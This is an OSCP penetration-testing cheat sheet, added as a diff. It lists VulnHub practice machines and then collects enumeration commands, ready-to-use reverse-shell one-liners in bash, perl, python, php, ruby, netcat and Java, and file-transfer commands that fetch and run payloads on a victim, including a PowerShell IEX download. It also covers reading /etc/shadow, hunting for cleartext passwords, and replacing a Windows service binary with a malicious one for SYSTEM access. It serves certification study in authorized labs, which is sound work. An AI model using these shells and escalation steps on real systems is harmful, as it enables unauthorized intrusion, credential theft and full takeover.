@@ -1,0 +1,458 @@
+Review OSCP and LAPS - CAVE 
+-------------------------------------------------------------------------------------------------
+LAB:
+
+(#1) Kioptrix: 2014 https://www.vulnhub.com/entry/kioptrix-2014-5,62/
+(#2) FristiLeaks: 1.3 https://www.vulnhub.com/entry/fristileaks-13,133/
+(#3) Stapler: 1 https://www.vulnhub.com/entry/stapler-1,150/
+(#4) VulnOS: 2 https://www.vulnhub.com/entry/vulnos-2,147/
+(#5) SickOs: 1.2 https://www.vulnhub.com/entry/sickos-12,144/
+(#6) Brainpan: 1 ttps://www.vulnhub.com/entry/brainpan-1,51/ ←(THIS ONE IS GREAT FOR BoF PRACTICE)
+(#7) HackLAB: Vulnix https://www.vulnhub.com/entry/hacklab-vulnix,48/
+(#8) /dev/random: scream https://www.vulnhub.com/entry/devrandom-scream,47/
+(#9) pWnOS: 2.0 https://www.vulnhub.com/entry/pwnos-20-pre-release,34/
+(#10) SkyTower: 1 https://www.vulnhub.com/entry/skytower-1,96/
+(#11) By special request from dud3z DC416 CTF “Basement” https://www.vulnhub.com/series/dc416,99/
+*****************************************************************
+UPDATED 15.07.19 with Vulnhub boxes added from other sources
+Kioptrix: Level 1 https://www.vulnhub.com/entry/kioptrix-level-1-1,22/
+Kioptrix: Level 1.1 https://www.vulnhub.com/entry/kioptrix-level-11-2,23/
+Kioptrix: Level 1.2 https://www.vulnhub.com/entry/kioptrix-level-12-3,24/
+Kioptrix: Level 1.3 https://www.vulnhub.com/entry/kioptrix-level-13-4,25/
+PwnLab: init https://www.vulnhub.com/entry/pwnlab-init,158/
+Mr Robot https://www.vulnhub.com/entry/mr-robot-1,151/
+HackLab: Vulnix https://www.vulnhub.com/entry/hacklab-vulnix,48/
+IMF https://www.vulnhub.com/entry/imf-1,162/
+NOT VULNHUB BUT GREAT FOR BoF PRACTICE
+https://github.com/justinsteven/dostackbufferoverflowgood
+https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/
+https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
+https://www.tenouk.com/Bufferoverflowc/Bufferoverflow1.html
+https://raw.githubusercontent.com/m0nad/Papers/master/buffer_overflow_iniciantes.txt
+
+
+-------------------------------------------------------------------------------------------------
+
+OSCP - Cheat Sheet
+
+
+#[A]:Enumration
+ 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+1- WhatWeb : its give you all the inforamtion of the target.
+
+Example: 
+
+root@kali:~# whatweb xXXxXxX.com
+http://XXxXXx.com [503 Service Unavailable] Apache, Cookies[OCSESSID,currency,language], Country[UNITED STATES][US], Email[donate@XxxXx.com], HTML5, HTTPServer[Apache], IP[0.0.0.0], JQuery[2.1.1], OpenCart, PoweredBy[OpenCart], Script[text/javascript], Title[This Is for test ], UncommonHeaders[retry-after,upgrade], X-UA-Compatible[IE=edge]
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+2- Nmap : Powerful tool for all the Port Scan and for the vulnerability into the service. 
+
+#Nmap Defualt Examples : 
+
+Scan all 65535 ports:	                      nmap -p- 192.168.1.1 
+Scan using TCP SYN scan (default):	        nmap -sS 192.168.1.1
+Scan UDP ports:	                            nmap -sU -p 123,161,162 192.168.1.1
+Scan selected ports - ignore discovery:	    nmap -Pn -F 192.168.1.1 (Use For Bypass FireWall) 
+
+
+
+
+#Nmap Service and OS Detection 
+
+Detect OS and Services:	                      nmap -A 192.168.1.1
+
+Standard service detection:                  	nmap -sV 192.168.1.1
+
+
+
+
+#Nmap Netbios Examples: 
+
+Find all Netbios servers on subnet:                         nmap -sV -v -p 139,445 10.0.0.1/24
+
+Display Netbios name:                                       nmap -sU --script nbstat.nse -p 137 target
+  
+Check if Netbios servers are:                               nmap --script-args=unsafe=1 --script 
+
+Checks for vulnerabilities present on SMB machine:          nmap -p 139,445 — script=smb-vuln* 10.11.1.1
+
+
+
+
+
+#Nmap OUTPUT on file 
+
+Save in all formats	                    nmap -oA outputfile 192.168.1.1
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+3- SearchSploit : its use for search into the exploits from the DB of Exploit-DB. 
+
+
+Use: SearchSploit [Name of Service]
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+4- SMB both windows and linux
+#Enumrates tools: 
+
+a) Enum4linux -v  192.168.8.10     
+b) smbmap -v  192.168.8.10     
+c) nbstat 192.168.8.10     
+
+
+#Exploit Null Session: 
+
+1)smbclient -L \\192.168.8.10\\SHARE -U "" 
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+#[B]Reverse shell: 
+
+#Reverse shellcode generation using msfvenom
+msfvenom -p php/reverse_php LHOST=10.11.1.1 LPORT=443 -f raw > shel.php
+
+
+#Bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+
+#PERL
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+#Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+#PHP
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+If you want a .php file to upload, see the more featureful and robust php-reverse-shell.
+
+
+#Ruby
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+
+#Netcat
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+
+
+#Java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#[C]:Post-Explotation 
+ 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#Trnasfer Files 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+[Linux]
+
+1- Python & CURL 
+
+#Attacking machine command:
+python -m SimpleHTTPServer 80
+
+#Victim machine command:
+wget http://192.168.1.35/FiletoTransfer
+
+
+2-SCP(SSH utility)
+
+#Attacking machine command:
+scp FiletoTransfer tester@192.168.1.39:/home/tester/iron/
+
+3-Netcat
+#Attacking machine command:
+nc 192.168.1.39 4444 -w 3 < FiletoTransfer
+
+#Victim machine command:
+nc -lvp 4444 > FiletoTransfer
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+[Windows]
+
+1-Python & CMD or POWESHELL
+#Attacking machine command:
+python -m SimpleHTTPServer 8080
+
+#Victim machine command:
+powershell.exe -c "(New-Object System.NET.WebClient).D
+
+
+
+2- Certutil.exe 
+#Attacking machine command:
+python -m SimpleHTTPServer 8080
+
+#Victim machine command:
+certutil.exe -urlcache -split -f http://10.10.10.1:8080/FiletoTransfer FiletoTransfer
+
+
+
+3-FTP
+#Attacking machine command:
+twistd -n ftp -r .
+
+#Victim machine command:
+ftp
+open 10.10.10.1 2121
+anonymous
+get FiletoTransfer
+bye
+
+
+
+4-SMB
+#Attacking machine command:
+impacket-smbserver -smb2support test .
+
+#Victim machine command:
+copy \\10.10.10.1:8080\FiletoTransfer FiletoTransfer
+
+
+
+5-Powercat
+#Victim machine command:
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.1/powercat.ps1');powercat -l -p 4444 -i C:\Users\test\FiletoDownload"
+
+#Attacking machine command:
+wget http://10.10.10.2:4444/FiletoDownload
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#[D]Privilege Escalation Linux 
+
+##[NOTE] tthe format of commands and description it will be like that : 
+Command [description of Command]
+
+---------------------------------------------------------------------------------------------------------------------
+
+1- Kernel, Operating System & Device Information:
+
+uname -a	                  [Print all available system information]
+uname -r	                  [Kernel release]
+uname -n	                  [System hostname]
+hostname                   	[As above]
+uname -m	                  [Linux kernel architecture (32 or 64 bit)]
+cat /proc/version         	[Kernel information]
+cat /etc/*-release	        [Distribution information]
+cat /etc/issue	            [As above]
+cat /proc/cpuinfo	          [CPU information]
+df -a	                      [File system information]
+
+
+
+
+
+2-Users & Groups:
+
+
+
+cat /etc/passwd                    	[List all users on the system]
+
+cat /etc/group	                    [List all groups on the system]
+
+for i in $(cat /etc/passwd 2>/dev/null| cut -d":" -f1 2>/dev/null);do id $i;done 2>/dev/null	      [List all uid’s and respective group memberships
+
+cat /etc/shadow	[Show user hashes – Privileged command
+
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'	                                         [List all super user accounts]
+
+finger                             	[Users currently logged in]
+
+pinky                             	[As above]
+
+users	                              [As above]
+
+who -a                             	[As above]
+
+last	                              [Listing of last logged on users]
+
+lastlog	                            [Information on when all users last logged in]
+
+lastlog –u %username%             	[Information on when the specified user last logged in]
+
+lastlog |grep -v "Never"	          [Entire list of previously logged on users]
+
+
+ 
+
+
+
+
+3-User & Privilege Information:
+
+
+
+whoami	              [Current username] 
+
+id	                  [Current user information]
+
+cat /etc/sudoers	    [Who’s allowed to do what as root – Privileged command]
+
+sudo -l             	[Can the current user perform anything as root]  
+ 
+
+
+
+
+
+4-Service Information:
+
+ps aux | grep root                                                          [View services running as root]
+
+ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'	    [Lookup process binary path and permissions]
+
+cat /etc/inetd.conf   	                                                    [List services managed by inetd]
+
+cat /etc/xinetd.conf	                                                      [As above for xinetd]
+
+cat /etc/xinetd.conf 2>/dev/null | awk '{print $7}' |xargs -r ls -la 2>/dev/null	    [A very ‘rough’ command to extract associated binaries from xinetd.conf and show permissions of each]
+
+ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null	               [Permissions and contents of /etc/exports (NFS)]
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#[D]Privilege Escalation Windows
+
+##[NOTE] the format of commands and description it will be like that : 
+
+#Description of Command
+Command 
+---------------------------------------------------------------------------------------------------------------------
+1- Basic Enumeration of the System: 
+
+# Basics
+systeminfo
+hostname
+
+# Who am I?
+whoami
+echo %username%
+
+# What users/localgroups are on the machine?
+net users
+net localgroups
+
+# More info about a specific user. Check if user has privileges.
+net user user1
+
+# View Domain Groups
+net group /domain
+
+# View Members of Domain Group
+net group /domain <Group Name>
+
+# Firewall
+netsh firewall show state
+netsh firewall show config
+
+# Network
+ipconfig /all
+route print
+arp -A
+
+# How well patched is the system?
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+
+
+
+
+2- Cleartext Passwords
+Search for them
+
+findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+
+#Find all those strings in config files.
+dir /s *pass* == *cred* == *vnc* == *.config*
+
+# Find all passwords in all files.
+findstr /spin "password" *.*
+findstr /spin "password" *.*
+
+
+
+
+3-Service only available from inside
+
+#list inside 
+netstat -ano 
+
+3-sc.exe
+
+#Search for weak Service and write the result into Servicenames.txt
+sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
+
+#edit the file by name and service 
+FOR /F %i in (Servicenames.txt) DO echo %i
+
+#open the file into CMD 
+type Servicenames.txt
+#Now you can process them one by one with the cacls command.
+FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
+FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+#Look for Weakness
+cacls "C:\path\to\file.exe"
+
+What we are interested in is binaries that have been installed by the user. In the output you want to look for BUILTIN\Users:(F). Or where your user/usergroup has (F) or (C) rights.
+
+Example:
+
+C:\path\to\file.exe 
+BUILTIN\Users:F
+BUILTIN\Power Users:C 
+BUILTIN\Administrators:F 
+NT AUTHORITY\SYSTEM:F
+
+That means your user has write access. So you can just rename the .exe file and then add your own malicious binary. And then restart the program and your binary will be executed instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom.
+
+Here is a POC code for getsuid >>> [inFiles.]
+
+We then compile it with mingw like this:
+
+i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
+
+Restart the Service
+
+#Okay, so now that we have a malicious binary in place we need to restart the service so that it gets executed. We can do this by using wmic or net the following way:
+
+wmic service NAMEOFSERVICE call startservice
+net stop [service name] && net start [service name].
+
+#The binary should now be executed in the SYSTEM or Administrator context.
+Migrate the meterpreter shell
+If your meterpreter session dies right after you get it you need migrate it to a more stable service. A common service to migrate to is winlogon.exe since it is run by system and it is always run. You can find the PID like this:
+
+wmic process list brief | find "winlogon"
+
+
+So when you get the shell you can either type migrate PID or automate this so that meterpreter automatically migrates.
+
+
+
+### Wish Best For All Group of CAVE ###
